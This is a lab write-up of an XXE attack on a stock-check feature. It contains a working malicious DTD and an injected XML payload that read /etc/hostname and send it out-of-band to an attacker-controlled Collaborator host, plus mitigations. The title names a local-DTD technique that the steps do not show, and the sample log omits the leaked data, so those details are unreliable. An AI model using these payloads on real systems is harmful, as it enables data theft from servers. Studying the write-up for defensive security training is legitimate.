
# 1. Exploiting XXE to Retrieve Data by Repurposing a Local DTD

## 2. CVSS Score

**CVSS v3.1 Base Score: 9.1 (Critical)**
**CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)**

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A10:2021 – Server-Side Request Forgery (SSRF)**

---

## 4. Description of Vulnerability

In this lab, we exploit an **XML External Entity (XXE)** vulnerability using a **malicious DTD (Document Type Definition)** file to retrieve data from the server. The attack leverages the **parameter entity** functionality to execute **out-of-band interactions**, specifically by exfiltrating the content of a sensitive file on the server, such as `/etc/hostname`, by initiating DNS and HTTP requests to an attacker-controlled Burp Collaborator subdomain.

---

## 5. Detailed Explanation of What We Performed

The goal was to inject a **malicious DTD** into the POST request made by the "Check stock" feature. This DTD file contained an **external entity** that references a **file** on the server (`/etc/hostname`) and exfiltrates the file’s contents to the **Burp Collaborator** server via a **parameter entity**. By observing **out-of-band interactions** (DNS and HTTP), we confirmed the XXE vulnerability.

---

## 6. Step-by-Step Procedure

### Step 1: Generate Burp Collaborator Payload

1. Open **Burp Suite Professional**.
2. Navigate to the **Collaborator tab** and click **"Copy to clipboard"** to generate a unique **Burp Collaborator subdomain** (e.g., `abc123xyz.burpcollaborator.net`).

### Step 2: Create the Malicious DTD File

3. Use the copied Collaborator subdomain and craft the following malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://abc123xyz.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

4. Save the file on your server or use **Burp Suite’s "Go to exploit server"** to host the malicious DTD file.
5. Note the URL of the DTD file (e.g., `http://your-server.com/malicious.dtd`).

### Step 3: Inject the Malicious DTD into the Stock Check Request

6. Visit the **product page** and click **"Check stock"** to trigger the POST request.
7. Intercept the request in **Burp Suite Proxy** and modify the payload to include the following XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-server.com/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

8. Replace `http://your-server.com/malicious.dtd` with the actual URL of the malicious DTD file.

### Step 4: Forward the Request and Monitor Collaborator

9. Forward the modified request to the server.
10. Return to the **Collaborator tab** and click **"Poll now"** to check for interactions.

### Step 5: Confirm Out-of-Band Interaction

11. After a few seconds, check for **DNS** and **HTTP** interactions in the **Collaborator tab**.
12. You should see interactions triggered by the application. One of the interactions will be the **HTTP request** containing the contents of the `/etc/hostname` file.

---

## 7. Impact of the Vulnerability

* **Sensitive File Exposure**: Attackers can exfiltrate sensitive system files like `/etc/hostname`, leading to further attacks or reconnaissance.
* **Out-of-Band Data Exfiltration**: Even though the application does not directly reflect the contents in the response, data can still be leaked via DNS and HTTP requests initiated by the server.
* **Server Information Disclosure**: Revealing server-specific details (like the hostname) can provide attackers with valuable information for further attacks, such as **privilege escalation** or **targeted exploits**.

---

## 8. Recommendations and Mitigations

* **Disable DTD Processing**: Configure XML parsers to reject `DOCTYPE` declarations and prevent external entities altogether.
* **Use Secure XML Parsers**: Employ libraries like **defusedxml** to ensure secure parsing of XML files and prevent XXE vulnerabilities.
* **Sanitize User Input**: Properly validate and sanitize all user inputs, including XML documents, before processing them.
* **Limit External Requests**: Restrict or monitor outbound HTTP/DNS requests from the server to mitigate the risk of out-of-band interactions.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe)

---

## 10. Proof of Concept

### Malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://abc123xyz.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

### Exploited XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-server.com/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Collaborator Log Output:

```
[DNS] abc123xyz.burpcollaborator.net -> <source-ip>
[HTTP] GET /?x=%file HTTP/1.1
Host: abc123xyz.burpcollaborator.net
User-Agent: Java/1.8.0
...
